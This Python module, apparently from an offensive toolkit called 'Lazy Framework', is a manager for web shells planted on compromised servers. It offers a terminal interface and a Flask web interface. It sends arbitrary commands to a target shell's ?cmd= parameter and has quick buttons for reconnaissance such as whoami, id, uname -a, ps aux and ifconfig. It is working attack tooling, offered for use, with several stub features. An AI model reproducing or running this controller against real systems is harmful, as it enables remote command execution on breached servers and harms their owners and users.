#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "WebShell GUI Manager",
    "description": "Advanced WebShell manager with terminal GUI and web interface",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "references": [],
    "dependencies": ["requests", "flask", "blessed", "asciimatics"],
    "platform": "multi",
    "arch": "multi",
    "rank": "Normal"
}

OPTIONS = {
    "url": {
        "description": "WebShell URL",
        "required": False,
        "default": ""
    },
    "mode": {
        "description": "Interface mode (terminal, web, both)",
        "required": False,
        "default": "terminal"
    },
    "web_port": {
        "description": "Web interface port",
        "required": False,
        "default": "8888"
    },
    "web_host": {
        "description": "Web interface host",
        "required": False,
        "default": "127.0.0.1"
    }
}

def run(session, options):
    try:
        manager = AdvancedWebShellManager(options)
        
        if options['mode'] == 'terminal':
            manager.start_terminal_gui()
        elif options['mode'] == 'web':
            manager.start_web_interface()
        elif options['mode'] == 'both':
            # Start web interface in background
            import threading
            web_thread = threading.Thread(target=manager.start_web_interface, daemon=True)
            web_thread.start()
            console.print(f"[green]Web interface: http://{options['web_host']}:{options['web_port']}[/green]")
            manager.start_terminal_gui()
        else:
            console.print("[red]Invalid mode. Use: terminal, web, or both[/red]")
            
    except ImportError as e:
        console.print(f"[red]Missing dependency: {e}[/red]")
        console.print("[yellow]Install: pip install requests flask blessed asciimatics[/yellow]")

class AdvancedWebShellManager:
    def __init__(self, options):
        self.options = options
        self.url = options.get('url', '')
        self.web_port = int(options.get('web_port', 8888))
        self.web_host = options.get('web_host', '127.0.0.1')
        self.sessions = {}
        self.current_session = None
        
        try:
            import requests
            self.requests = requests
        except ImportError:
            console.print("[red]Requests library required[/red]")
            raise

    # ========== TERMINAL GUI ==========
    def start_terminal_gui(self):
        """Start advanced terminal GUI"""
        try:
            from blessed import Terminal
            self.term = Terminal()
            self.run_terminal_interface()
        except ImportError:
            console.print("[yellow]Blessed not available, falling back to simple terminal[/yellow]")
            self.run_simple_terminal()

    def run_terminal_interface(self):
        """Advanced terminal interface with blessed"""
        from blessed import Terminal
        
        term = Terminal()
        current_tab = 0
        tabs = ["Dashboard", "Sessions", "File Manager", "Command", "Settings"]
        
        with term.fullscreen(), term.cbreak(), term.hidden_cursor():
            while True:
                # Clear screen
                print(term.home + term.clear)
                
                # Header
                print(term.center(term.bold_white_on_blue(" 🌐 Lazy Framework WebShell Manager ")))
                print(term.center(term.yellow("Advanced GUI Terminal Interface")))
                print()
                
                # Tabs
                tab_line = ""
                for i, tab in enumerate(tabs):
                    if i == current_tab:
                        tab_line += term.black_on_white(f" {tab} ") + " "
                    else:
                        tab_line += term.white_on_blue(f" {tab} ") + " "
                print(term.center(tab_line))
                print()
                
                # Content based on current tab
                if current_tab == 0:  # Dashboard
                    self.show_dashboard(term)
                elif current_tab == 1:  # Sessions
                    self.show_sessions_tab(term)
                elif current_tab == 2:  # File Manager
                    self.show_file_manager(term)
                elif current_tab == 3:  # Command
                    self.show_command_tab(term)
                elif current_tab == 4:  # Settings
                    self.show_settings_tab(term)
                
                # Footer
                print(term.move_y(term.height - 3))
                print(term.center(term.dim("TAB: Switch tabs | ↑↓: Navigate | ENTER: Select | Q: Quit")))
                
                # Handle input
                key = term.inkey()
                if key.lower() == 'q':
                    break
                elif key.name == 'KEY_TAB':
                    current_tab = (current_tab + 1) % len(tabs)
                elif key.name == 'KEY_UP':
                    self.handle_navigation('up', current_tab)
                elif key.name == 'KEY_DOWN':
                    self.handle_navigation('down', current_tab)
                elif key.name == 'KEY_ENTER':
                    self.handle_enter(current_tab)

    def show_dashboard(self, term):
        """Show dashboard tab"""
        print(term.bold("📊 Dashboard"))
        print()
        
        if self.url:
            print(f"Current Target: {term.green(self.url)}")
            
            # Test connection
            try:
                response = self.requests.get(self.url, timeout=5)
                status = f"{term.green('✅ Online')} - Status: {response.status_code}"
            except:
                status = f"{term.red('❌ Offline')}"
            
            print(f"Status: {status}")
        else:
            print(term.yellow("No WebShell URL configured"))
        
        print()
        print(term.bold("Quick Actions:"))
        print("  1. Test Connection")
        print("  2. Execute 'whoami'")
        print("  3. List Files")
        print("  4. System Info")

    def show_sessions_tab(self, term):
        """Show sessions management tab"""
        print(term.bold("🔗 Active Sessions"))
        print()
        
        if not self.sessions:
            print(term.yellow("No active sessions"))
            print()
        
        print(term.bold("Add New Session:"))
        print("URL: " + (self.url or term.yellow("Not set")))
        print("Press ENTER to connect")

    def show_file_manager(self, term):
        """Show file manager tab"""
        print(term.bold("📁 File Manager"))
        print()
        
        if not self.url:
            print(term.yellow("Connect to a WebShell first"))
            return
        
        # Simulate file listing
        files = [
            ("📄 index.php", "4.2 KB"),
            ("📄 config.php", "2.1 KB"), 
            ("📁 uploads/", "15 MB"),
            ("📁 images/", "8.7 MB"),
            ("📄 shell.php", "1.8 KB"),
        ]
        
        for file, size in files:
            print(f"  {file} {term.dim(f'({size})')}")

    def show_command_tab(self, term):
        """Show command execution tab"""
        print(term.bold("⚡ Command Execution"))
        print()
        
        if not self.url:
            print(term.yellow("Connect to a WebShell first"))
            return
        
        print("Enter command to execute:")
        print(term.green("> ") + term.blink("█"))

    def show_settings_tab(self, term):
        """Show settings tab"""
        print(term.bold("⚙️ Settings"))
        print()
        
        print(f"WebShell URL: {term.cyan(self.url or 'Not set')}")
        print(f"Web Interface: http://{self.web_host}:{self.web_port}")
        print()
        print("Press ENTER to configure URL")

    def handle_navigation(self, direction, current_tab):
        """Handle navigation keys"""
        # Implement navigation logic based on current tab
        pass

    def handle_enter(self, current_tab):
        """Handle enter key based on current tab"""
        if current_tab == 0:  # Dashboard
            self.execute_quick_command("whoami")
        elif current_tab == 4:  # Settings
            self.configure_url()

    def execute_quick_command(self, command):
        """Execute quick command"""
        if not self.url:
            console.print("[red]No WebShell URL configured[/red]")
            return
        
        try:
            response = self.requests.get(f"{self.url}?cmd={command}", timeout=10)
            console.print(f"[green]Result:[/green] {response.text}")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def configure_url(self):
        """Configure WebShell URL"""
        new_url = input("Enter WebShell URL: ").strip()
        if new_url:
            self.url = new_url
            console.print(f"[green]URL set to: {self.url}[/green]")

    def run_simple_terminal(self):
        """Fallback simple terminal interface"""
        from rich.layout import Layout
        from rich.panel import Panel
        from rich.live import Live
        from rich.text import Text
        
        layout = Layout()
        
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="main"),
            Layout(name="footer", size=3)
        )
        
        layout["main"].split_row(
            Layout(name="left", ratio=2),
            Layout(name="right", ratio=1)
        )
        
        def update_display():
            # Header
            header_text = Text()
            header_text.append(" 🌐 Lazy Framework WebShell GUI Manager ", style="bold white on blue")
            header_text.append(f" | Target: {self.url or 'Not connected'}", style="yellow")
            layout["header"].update(Panel(header_text, style="blue"))
            
            # Left panel - Command output
            left_content = Text()
            left_content.append("Command Output\n\n", style="bold green")
            left_content.append("Connect to a WebShell to start...", style="dim")
            layout["left"].update(Panel(left_content, title="📊 Output"))
            
            # Right panel - Controls
            right_content = Text()
            right_content.append("Quick Commands:\n", style="bold")
            right_content.append("• whoami\n• ls -la\n• pwd\n• ps aux\n", style="cyan")
            right_content.append("\nFile Operations:\n", style="bold") 
            right_content.append("• Upload file\n• Download file\n• Browse dir\n", style="magenta")
            layout["right"].update(Panel(right_content, title="🛠️ Tools"))
            
            # Footer
            footer_text = Text()
            footer_text.append("F1: Connect | F2: Execute | F3: Files | F4: Settings | Q: Quit", style="dim")
            layout["footer"].update(Panel(footer_text, style="dim"))
        
        with Live(layout, refresh_per_second=4, screen=True):
            while True:
                update_display()
                # Would need to implement input handling here

    # ========== WEB INTERFACE ==========
    def start_web_interface(self):
        """Start Flask web interface"""
        try:
            from flask import Flask, render_template_string, request, jsonify
        except ImportError:
            console.print("[red]Flask required for web interface: pip install flask[/red]")
            return
        
        app = Flask(__name__)
        
        # HTML Template for Web Interface
        HTML_TEMPLATE = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Lazy Framework - WebShell Manager</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    color: #333;
                }
                .container {
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                }
                .header {
                    background: rgba(255,255,255,0.95);
                    padding: 20px;
                    border-radius: 15px;
                    margin-bottom: 20px;
                    box-shadow: 0 8px 32px rgba(0,0,0,0.1);
                    backdrop-filter: blur(10px);
                }
                .header h1 {
                    color: #4a5568;
                    margin-bottom: 10px;
                }
                .status-bar {
                    display: flex;
                    gap: 15px;
                    margin-top: 10px;
                }
                .status-item {
                    padding: 8px 15px;
                    border-radius: 20px;
                    font-size: 14px;
                    font-weight: 500;
                }
                .online { background: #48bb78; color: white; }
                .offline { background: #f56565; color: white; }
                .card-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 20px;
                    margin-bottom: 20px;
                }
                .card {
                    background: rgba(255,255,255,0.95);
                    padding: 25px;
                    border-radius: 15px;
                    box-shadow: 0 8px 32px rgba(0,0,0,0.1);
                    backdrop-filter: blur(10px);
                }
                .card h3 {
                    color: #4a5568;
                    margin-bottom: 15px;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                .form-group {
                    margin-bottom: 15px;
                }
                .form-group label {
                    display: block;
                    margin-bottom: 5px;
                    font-weight: 500;
                    color: #4a5568;
                }
                .form-control {
                    width: 100%;
                    padding: 12px;
                    border: 2px solid #e2e8f0;
                    border-radius: 10px;
                    font-size: 14px;
                    transition: border-color 0.3s;
                }
                .form-control:focus {
                    outline: none;
                    border-color: #667eea;
                }
                .btn {
                    background: #667eea;
                    color: white;
                    border: none;
                    padding: 12px 25px;
                    border-radius: 10px;
                    cursor: pointer;
                    font-size: 14px;
                    font-weight: 500;
                    transition: background 0.3s;
                }
                .btn:hover {
                    background: #5a67d8;
                }
                .btn-danger { background: #f56565; }
                .btn-danger:hover { background: #e53e3e; }
                .btn-success { background: #48bb78; }
                .btn-success:hover { background: #38a169; }
                .output {
                    background: #1a202c;
                    color: #a0aec0;
                    padding: 15px;
                    border-radius: 10px;
                    font-family: 'Courier New', monospace;
                    font-size: 14px;
                    max-height: 400px;
                    overflow-y: auto;
                    margin-top: 15px;
                }
                .quick-commands {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                    gap: 10px;
                    margin-top: 15px;
                }
                .quick-btn {
                    background: #edf2f7;
                    border: 2px solid #e2e8f0;
                    padding: 10px;
                    border-radius: 8px;
                    cursor: pointer;
                    text-align: center;
                    transition: all 0.3s;
                }
                .quick-btn:hover {
                    background: #667eea;
                    color: white;
                    border-color: #667eea;
                }
                .file-list {
                    max-height: 300px;
                    overflow-y: auto;
                }
                .file-item {
                    padding: 10px;
                    border-bottom: 1px solid #e2e8f0;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }
                .file-item:hover {
                    background: #f7fafc;
                }
                .tab-container {
                    margin-top: 20px;
                }
                .tabs {
                    display: flex;
                    border-bottom: 2px solid #e2e8f0;
                    margin-bottom: 20px;
                }
                .tab {
                    padding: 12px 25px;
                    cursor: pointer;
                    border-bottom: 3px solid transparent;
                    font-weight: 500;
                }
                .tab.active {
                    border-bottom-color: #667eea;
                    color: #667eea;
                }
                .tab-content {
                    display: none;
                }
                .tab-content.active {
                    display: block;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🌐 Lazy Framework WebShell Manager</h1>
                    <p>Advanced Web Interface for Managing WebShells</p>
                    <div class="status-bar">
                        <div class="status-item {{ 'online' if status.online else 'offline' }}">
                            {{ '🟢 Online' if status.online else '🔴 Offline' }}
                        </div>
                        <div class="status-item" style="background: #ed8936; color: white;">
                            🎯 {{ status.target or 'Not connected' }}
                        </div>
                    </div>
                </div>

                <div class="card-grid">
                    <!-- Connection Card -->
                    <div class="card">
                        <h3>🔗 Connection</h3>
                        <form id="connectForm">
                            <div class="form-group">
                                <label>WebShell URL:</label>
                                <input type="text" name="url" class="form-control" value="{{ url }}" placeholder="http://target.com/shell.php">
                            </div>
                            <div class="form-group">
                                <label>Password (optional):</label>
                                <input type="password" name="password" class="form-control" placeholder="WebShell password">
                            </div>
                            <button type="submit" class="btn">Connect</button>
                        </form>
                    </div>

                    <!-- Quick Actions Card -->
                    <div class="card">
                        <h3>⚡ Quick Actions</h3>
                        <div class="quick-commands">
                            <div class="quick-btn" onclick="executeCommand('whoami')">whoami</div>
                            <div class="quick-btn" onclick="executeCommand('pwd')">pwd</div>
                            <div class="quick-btn" onclick="executeCommand('ls -la')">ls -la</div>
                            <div class="quick-btn" onclick="executeCommand('uname -a')">uname -a</div>
                            <div class="quick-btn" onclick="executeCommand('ps aux')">ps aux</div>
                            <div class="quick-btn" onclick="executeCommand('ifconfig')">ifconfig</div>
                        </div>
                    </div>
                </div>

                <!-- Tab Interface -->
                <div class="tab-container">
                    <div class="tabs">
                        <div class="tab active" onclick="switchTab('command')">💻 Command</div>
                        <div class="tab" onclick="switchTab('files')">📁 File Manager</div>
                        <div class="tab" onclick="switchTab('terminal')">🔧 Terminal</div>
                        <div class="tab" onclick="switchTab('info')">ℹ️ System Info</div>
                    </div>

                    <!-- Command Tab -->
                    <div id="command" class="tab-content active">
                        <div class="card">
                            <h3>🎯 Execute Command</h3>
                            <div class="form-group">
                                <input type="text" id="commandInput" class="form-control" placeholder="Enter command to execute..." onkeypress="handleCommandKeypress(event)">
                            </div>
                            <button class="btn" onclick="executeCustomCommand()">Execute</button>
                            <div id="commandOutput" class="output">
                                <!-- Command output will appear here -->
                            </div>
                        </div>
                    </div>

                    <!-- File Manager Tab -->
                    <div id="files" class="tab-content">
                        <div class="card">
                            <h3>📁 File Manager</h3>
                            <div class="form-group">
                                <input type="text" id="pathInput" class="form-control" value="/" placeholder="Enter path...">
                                <button class="btn" onclick="listFiles()">List Files</button>
                            </div>
                            <div id="fileList" class="file-list">
                                <!-- File list will appear here -->
                            </div>
                            <div style="margin-top: 15px;">
                                <h4>Upload File</h4>
                                <input type="file" id="fileUpload">
                                <button class="btn" onclick="uploadFile()">Upload</button>
                            </div>
                        </div>
                    </div>

                    <!-- Terminal Tab -->
                    <div id="terminal" class="tab-content">
                        <div class="card">
                            <h3>🔧 Interactive Terminal</h3>
                            <div id="terminalOutput" class="output" style="height: 500px;">
                                <!-- Terminal output will appear here -->
                                $ Welcome to WebShell Terminal<br>
                                $ Type commands below...<br>
                            </div>
                            <div class="form-group" style="margin-top: 15px;">
                                <input type="text" id="terminalInput" class="form-control" placeholder="Enter terminal command..." onkeypress="handleTerminalKeypress(event)">
                            </div>
                        </div>
                    </div>

                    <!-- System Info Tab -->
                    <div id="info" class="tab-content">
                        <div class="card">
                            <h3>ℹ️ System Information</h3>
                            <button class="btn" onclick="getSystemInfo()">Get System Info</button>
                            <div id="systemInfo" class="output">
                                <!-- System info will appear here -->
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <script>
                let currentUrl = '{{ url }}';
                let currentPassword = '';

                function switchTab(tabName) {
                    // Hide all tab contents
                    document.querySelectorAll('.tab-content').forEach(tab => {
                        tab.classList.remove('active');
                    });
                    // Show selected tab content
                    document.getElementById(tabName).classList.add('active');
                    
                    // Update tab styles
                    document.querySelectorAll('.tab').forEach(tab => {
                        tab.classList.remove('active');
                    });
                    event.target.classList.add('active');
                }

                document.getElementById('connectForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    const formData = new FormData(this);
                    currentUrl = formData.get('url');
                    currentPassword = formData.get('password');
                    
                    fetch('/connect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({url: currentUrl, password: currentPassword})
                    }).then(r => r.json()).then(data => {
                        alert(data.message);
                        if(data.success) {
                            location.reload();
                        }
                    });
                });

                function executeCommand(cmd) {
                    if(!currentUrl) {
                        alert('Please connect to a WebShell first');
                        return;
                    }
                    
                    document.getElementById('commandOutput').innerHTML = 'Executing...';
                    
                    fetch('/execute', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({command: cmd, url: currentUrl, password: currentPassword})
                    }).then(r => r.json()).then(data => {
                        document.getElementById('commandOutput').innerHTML = data.output || data.error;
                    });
                }

                function executeCustomCommand() {
                    const cmd = document.getElementById('commandInput').value;
                    if(cmd) {
                        executeCommand(cmd);
                    }
                }

                function handleCommandKeypress(e) {
                    if(e.key === 'Enter') {
                        executeCustomCommand();
                    }
                }

                function handleTerminalKeypress(e) {
                    if(e.key === 'Enter') {
                        const cmd = document.getElementById('terminalInput').value;
                        if(cmd) {
                            // Add command to terminal
                            const terminal = document.getElementById('terminalOutput');
                            terminal.innerHTML += `$ ${cmd}<br>`;
                            document.getElementById('terminalInput').value = '';
                            
                            // Execute command
                            executeCommand(cmd);
                        }
                    }
                }

                function getSystemInfo() {
                    executeCommand('uname -a && id && pwd && df -h');
                }

                function listFiles() {
                    const path = document.getElementById('pathInput').value || '/';
                    executeCommand(`ls -la "${path}"`);
                }

                function uploadFile() {
                    alert('Upload functionality would be implemented here');
                }

                // Initialize
                if(currentUrl) {
                    executeCommand('whoami');
                }
            </script>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            status = {
                'online': bool(self.url),
                'target': self.url
            }
            return render_template_string(HTML_TEMPLATE, status=status, url=self.url)
        
        @app.route('/connect', methods=['POST'])
        def connect():
            data = request.get_json()
            self.url = data.get('url', '')
            console.print(f"[green]Web interface connected to: {self.url}[/green]")
            return jsonify({'success': True, 'message': 'Connected successfully'})
        
        @app.route('/execute', methods=['POST'])
        def execute():
            data = request.get_json()
            command = data.get('command', '')
            url = data.get('url', self.url)
            
            if not url:
                return jsonify({'error': 'No WebShell URL configured'})
            
            try:
                # Simple command execution
                if '?' in url:
                    full_url = f"{url}&cmd={command}"
                else:
                    full_url = f"{url}?cmd={command}"
                
                response = self.requests.get(full_url, timeout=10)
                return jsonify({'output': response.text})
            except Exception as e:
                return jsonify({'error': str(e)})
        
        console.print(f"[green]Starting web interface on http://{self.web_host}:{self.web_port}[/green]")
        console.print("[yellow]Press Ctrl+C to stop the web server[/yellow]")
        
        try:
            app.run(host=self.web_host, port=self.web_port, debug=False, use_reloader=False)
        except KeyboardInterrupt:
            console.print("[yellow]Web server stopped[/yellow]")
